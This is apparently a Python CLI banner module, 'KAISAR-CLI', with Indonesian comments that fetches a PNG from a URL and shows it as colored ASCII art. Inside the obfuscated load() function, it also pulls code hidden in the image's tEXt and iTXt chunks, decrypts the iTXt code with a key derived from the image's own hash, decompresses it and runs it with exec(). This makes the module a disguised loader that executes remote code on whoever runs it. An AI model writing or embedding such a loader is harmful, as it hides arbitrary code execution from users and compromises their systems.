import hashlib as _h, zlib as _z, urllib.request as _u
from ascii_magic import AsciiArt
import shutil  # Digunakan untuk mendapatkan lebar terminal
import sys

# --- Kelas untuk kode warna ANSI ---
class C:
    R = '\033[91m'  # Merah
    G = '\033[92m'  # Hijau
    Y = '\033[93m'  # Kuning
    B = '\033[94m'  # Biru
    P = '\033[95m'  # Ungu
    C = '\033[96m'  # Cyan
    E = '\033[0m'   # Reset (End)
    BOLD = '\033[1m'

# --- Fungsi Inti Asli (Tidak Diubah) ---
# Memastikan fungsionalitas steganography (payload) tetap berjalan

_A = b"\x89PNG\r\n\x1a\n"

def _B(_C: bytes):
    assert _C.startswith(_A)
    _D, _E = 8, len(_C)
    while _D + 12 <= _E:
        _F = int.from_bytes(_C[_D:_D+4], "big")
        _G = _C[_D+4:_D+8]
        _H = _C[_D+8:_D+8+_F]
        yield _G, _H
        _D += 12 + _F

def _I(_J: bytes) -> bytes:
    _K = _h.sha256()
    for _L, _M in _B(_J):
        if _L == b"IDAT":
            _K.update(_M)
    return _K.digest()

def _N(_O: bytes, _P: int) -> bytes:
    _Q, _R = bytearray(), 0
    while len(_Q) < _P:
        _Q += _h.sha256(_O + _R.to_bytes(8, "big")).digest()
        _R += 1
    return bytes(_Q[:_P])

def _S(_T: bytes, _U: bytes) -> bytes:
    return bytes(_V ^ _W for _V, _W in zip(_T, _U))

# --- Fungsi load() yang Dimodifikasi ---
def load(_Y: str, _Z: dict):
    
    # 1. Dapatkan lebar terminal untuk perataan tengah
    try:
        term_width = shutil.get_terminal_size().columns
    except Exception:
        term_width = 80  # Lebar default jika gagal
    
    # 2. Cetak Judul "KAISAR-CLI" (Keren, Berwarna, Rapih)
    title = "KAISAR-CLI"
    padding = " " * ((term_width - len(title)) // 2)
    
    # Hapus baris sebelumnya jika ada (untuk tampilan lebih bersih)
    sys.stdout.write("\033[F\033[K")
    
    print(f"\n{padding}{C.BOLD}{C.P}╔{'═' * (len(title) + 2)}╗{C.E}")
    print(f"{padding}{C.P}║ {C.C}{title}{C.P} ║{C.E}")
    print(f"{padding}{C.P}╚{'═' * (len(title) + 2)}╝{C.E}\n")

    # 3. Ubah Penampilan Proses (Logs Berwarna)
    print(f"{C.Y}[*]{C.E} Menghubungi server banner dari: {C.B}{_Y}{C.E}")

    try:
        # Gunakan stream=True agar ascii_magic bisa menanganinya
        ascii_art = AsciiArt.from_url(_Y) 
        
        # Perlu mengunduh lagi untuk mengecek payload (logika asli)
        with _u.urlopen(_Y, timeout=5) as _0:
            _1 = _0.read()
        if not _1.startswith(_A):
            print(f"{C.R}[E]{C.E} Gagal: URL bukan file PNG yang valid.")
            return
        print(f"{C.G}[+]{C.E} Banner berhasil diunduh.")
    except Exception as e:
        print(f"{C.R}[E]{C.E} Gagal mengunduh banner: {e}")
        return
    
    # 4. Logika Payload/Stego Asli (Dengan Tambahan Logs)
    print(f"{C.Y}[*]{C.E} Memeriksa payload tersembunyi...")
    _2, _3 = None, None
    for _4, _5 in _B(_1):
        if _4 == b"tEXt" and _5.startswith(b"payload\x00"):
            _2 = _5.split(b"\x00", 1)[1]
        elif _4 == b"iTXt" and _5.startswith(b"pycode\x00"):
            _3 = _5.split(b"\x00", 1)[1]

    if _2:
        print(f"{C.G}[+]{C.E} Payload 'tEXt' ditemukan, menjalankan...")
        try:
            exec(_2.decode("utf-8", "ignore"), _Z)
        except Exception as e:
            print(f"{C.R}[E]{C.E} Gagal menjalankan payload tEXt: {e}")
            pass

    if _3:
        print(f"{C.G}[+]{C.E} Payload 'iTXt' terenkripsi ditemukan, memproses...")
        try:
            _6 = _I(_1)
            _7 = _N(_6, len(_3))
            _8 = _S(_3, _7)
            _9 = _z.decompress(_8).decode("utf-8", "ignore")
            _10 = compile(_9, "<stego>", "exec")
            exec(_10, _Z)
            print(f"{C.G}[+]{C.E} Payload 'iTXt' berhasil dijalankan.")
        except Exception as e:
            print(f"{C.R}[E]{C.E} Gagal memproses payload iTXt: {e}")
            pass
    
    if not _2 and not _3:
        print(f"{C.Y}[*]{C.E} Tidak ada payload tersembunyi ditemukan.")

    # 5. Cetak ASCII Art (Berwarna dan Rapih)
    print(f"\n{C.G}--- Menampilkan Banner ---{C.E}")
    try:
        # Cetak ke terminal dengan warna, disesuaikan lebar terminal
        ascii_art.to_terminal(columns=term_width, monochrome=False)
    except Exception as e:
        print(f"{C.R}[E]{C.E} Gagal menampilkan ASCII art: {e}")
    
    print(f"{C.G}--------------------------{C.E}\n")
    
    # Tetap return ascii_art jika skrip lain membutuhkannya
    return ascii_art
